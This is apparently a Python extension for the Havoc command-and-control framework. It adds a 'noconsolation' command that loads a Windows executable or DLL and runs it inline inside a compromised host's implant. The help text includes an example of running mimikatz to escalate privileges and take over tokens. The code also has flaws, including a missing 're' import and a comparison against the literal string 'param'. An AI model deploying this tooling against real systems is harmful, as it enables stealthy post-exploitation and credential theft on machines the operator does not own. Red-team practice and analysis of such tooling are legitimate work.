
import os
from havoc import Demon, RegisterCommand

def is_windows_path(path):
    return re.match(r'^[a-zA-Z]:\\', path) is not None

def is_linux_path(path):
    return re.match(r'^/[a-zA-Z]', path) is not None

def noconsolation_parse_params( demon, params ):
    packer = Packer()

    num_params    = len( params )
    local         = False
    headers       = False
    method        = ''
    use_unicode   = False
    nooutput      = False
    alloc_console = False
    close_handles = False
    free_libs     = False
    timeout       = 60
    path_set      = False
    path          = ''
    pebytes       = b''

    if num_params < 1:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Invalid number of arguments" )
        return None, None

    skip = False
    for i in range( num_params ):
        if skip:
            skip = False
            continue
        param = params[i]

        if param == '--local' or 'param' == '-l':
            local = True
        elif param == '--timeout' or param == '-t':
            skip = True
            if i + 1 >= num_params:
                demon.ConsoleWrite( demon.CONSOLE_ERROR, "missing --timeout value" )
                return None, None
            try:
                timeout = int(params[i + 1])
            except:
                demon.ConsoleWrite( demon.CONSOLE_ERROR, "invalid --timeout value" )
                return None, None
        elif param == '-k':
            headers = True
        elif param == '--method' or param == '-m':
            skip = True
            if i + 1 >= num_params:
                demon.ConsoleWrite( demon.CONSOLE_ERROR, "missing --method value" )
                return None, None
            method = params[i + 1]
        elif param == '-w':
            use_unicode = True
        elif param == '--no-output' or param == '-no':
            nooutput = True
        elif param == '--alloc-console' or param == '-ac':
            alloc_console = True
        elif param == '--close-handles' or param == '-ch':
            close_handles = True
        elif param == '--free-libraries' or param == '-fl':
            free_libs = True
        elif os.path.exists( param ) or is_windows_path( param ):
            path_set = True
            path     = param
            break
        elif local is False and os.path.exists( param ) is False and is_linux_path( param ):
            demon.ConsoleWrite( demon.CONSOLE_INFO, f"Specified executable {path} does not exist" )
            return None, None
        elif param == '--help' or param == '-h':
            demon.ConsoleWrite( demon.CONSOLE_INFO, "Usage: noconsolation [--local] [--timeout 60] [-k] [--method funcname] [-w] [--no-output] [--alloc-console] [--close-handles] [--free-libraries] /path/to/binary.exe arg1 arg2" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --local, -l                           Optional. The binary should be loaded from the target Windows machine" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --timeout NUM_SECONDS, -t NUM_SECONDS Optional. The number of seconds you wish to wait for the PE to complete running. Default 60 seconds. Set to 0 to disable" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    -k                                    Optional. Overwrite the PE headers" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --method EXPORT_NAME, -m EXPORT_NAME  Optional. Method or function name to execute in case of DLL. If not provided, DllMain will be executed" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    -w                                    Optional. Command line is passed to unmanaged DLL function in UNICODE format. (default is ANSI)" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --no-output, -no                      Optional. Do not try to obtain the output" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --alloc-console, -ac                  Optional. Allocate a console. This will spawn a new process" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --close-handles, -ch                  Optional. Close Pipe handles once finished. If PowerShell was already ran, this will break the output for PowerShell in the future" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --free-libraries, -fl                 Optional. Free all loaded DLLs" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    /path/to/binary.exe                   Required. Full path to the windows EXE/DLL you wish you run inside Beacon" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    ARG1 ARG2                             Optional. Parameters for the PE. Must be provided after the path" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    Example: noconsolation --local C:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe $ExecutionContext.SessionState.LanguageMode" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    Example: noconsolation /tmp/mimikatz.exe privilege::debug token::elevate exit" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    Example: noconsolation --local C:\\windows\\system32\\cmd.exe /c ipconfig" )
            return None, None
        else:
            demon.ConsoleWrite( demon.CONSOLE_INFO, f"invalid argument: {param}" )
            return None, None

    if path_set is False:
        demon.ConsoleWrite( demon.CONSOLE_INFO, "PE path not provided" )
        return None, None

    if os.path.exists(path) is False and local is False:
        demon.ConsoleWrite( demon.CONSOLE_INFO, f"Specified executable {path} does not exist" )
        return None, None

    if local is False:
        pename = path.split("/")[-1]

        try:
            with open(path, 'rb') as f:
                pebytes = f.read()
        except:
            demon.ConsoleWrite( demon.CONSOLE_INFO, f"could not read PE" )
            return None, None

        if len(pebytes) == 0:
            demon.ConsoleWrite( demon.CONSOLE_INFO, f"The PE is empty" )
            return None, None

        path = ''
    else:
        pename = path.split("\\")[-1]

    # Iterate through args given
    cmdline = pename
    for y in range(i + 1, len(params)):
        arg = params[ y ]
        arg = arg.replace('\\"', '"')

        cmdline = f'{cmdline} {arg}'

    packer.addbytes(pebytes)
    packer.addstr(path)
    packer.addbool(local)
    packer.adduint32(timeout)
    packer.addbool(headers)
    packer.addWstr(cmdline)
    packer.addstr(cmdline)
    packer.addstr(method)
    packer.addbool(use_unicode)
    packer.addbool(nooutput)
    packer.addbool(alloc_console)
    packer.addbool(close_handles)
    packer.addbool(free_libs)

    return packer.getbuffer(), pename

def noconsolation( demonID, *params ):
    TaskID   : str    = None
    demon    : Demon  = None

    demon  = Demon( demonID )

    if demon.OSArch.startswith(demon.ProcessArch) is False:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "WoW64 is not supported" )
        return False

    packed_params, pename = noconsolation_parse_params(demon, params)
    if packed_params is None:
        return False

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to run {pename} inline" )

    demon.InlineExecute( TaskID, "go", f"bin/NoConsolation.{demon.ProcessArch}.o", packed_params, False )

    return TaskID

RegisterCommand( noconsolation, "", "noconsolation", "Execute a PE inline", 0, "[--local] [--timeout 60] [-k] [--method funcname] [-w] [--no-output] [--alloc-console] [--close-handles] [--free-libraries] /path/to/binary.exe arg1 arg2", "--local C:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe $ExecutionContext.SessionState.LanguageMode" )
